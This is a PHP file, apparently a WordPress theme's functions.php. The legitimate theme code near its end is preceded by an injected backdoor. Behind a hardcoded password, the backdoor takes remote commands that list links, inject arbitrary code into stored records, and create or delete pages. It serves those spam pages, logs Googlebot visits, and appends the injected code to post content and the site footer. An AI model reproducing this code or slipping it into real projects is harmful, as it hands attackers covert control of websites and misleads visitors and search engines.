<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8498f4d23f1b7a1205ff9840792d5507'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'install_meta` ORDER BY `url` DESC LIMIT 0, 2500', ARRAY_A) as $data)
						{
							print '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_links';
					if (isset($_REQUEST['data']))
						{
							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'install_meta` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
								{
									print "true";
								}
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'install_meta` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION";
			}
			
		die("");
	}

$super_url = 'http://' . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}
	
if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== FALSE) && ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'install_meta` WHERE `url` = "'.mysql_escape_string( $super_url ).'"') == '0') )
	{
		$wpdb->query(' INSERT INTO `' . $wpdb->prefix . 'install_meta` SET `url` = "'.mysql_escape_string($super_url).'" ');
	}
 
$GLOBALS['WP_URL_CD'] = stripslashes( $wpdb -> get_var('SELECT `code` FROM `' . $wpdb->prefix . 'install_meta` WHERE `url` = "'.mysql_escape_string($super_url).'"') );

if ($_SERVER["REQUEST_URI"] != "/")
add_filter('the_content', 'content_updt_theme');
add_action('wp_footer',   'content_updt_footer');

function content_updt_theme( $page )
	{
		$page .= $GLOBALS['WP_URL_CD'];
		$GLOBALS['WP_URL_CD'] = '';
		return $page ;
	}
	
function content_updt_footer()
	{
		print $GLOBALS['WP_URL_CD'];
	}

?><?php if (! defined('ABSPATH')) exit('No direct script access allowed');

require TEMPLATEPATH . DIRECTORY_SEPARATOR . 'Functions' . DIRECTORY_SEPARATOR . 'Bootstrap.php';
require TEMPLATEPATH . DIRECTORY_SEPARATOR . 'Functions' . DIRECTORY_SEPARATOR . 'Atendimento.php';
require TEMPLATEPATH . DIRECTORY_SEPARATOR . 'Functions' . DIRECTORY_SEPARATOR . 'Produtos.php';

$Bootstrap = new Bootstrap;
$Atendimento = new Atendimento;
$Produtos = new Produtos;

function new_excerpt_length($length) {
   return 999999999;
}
add_filter('excerpt_length', 'new_excerpt_length');


function excerpt($length, $text) {
   if (strlen($text) <= $length)
      return $text;

   $new = substr($text, 0, $length);

   return $new.'...';
}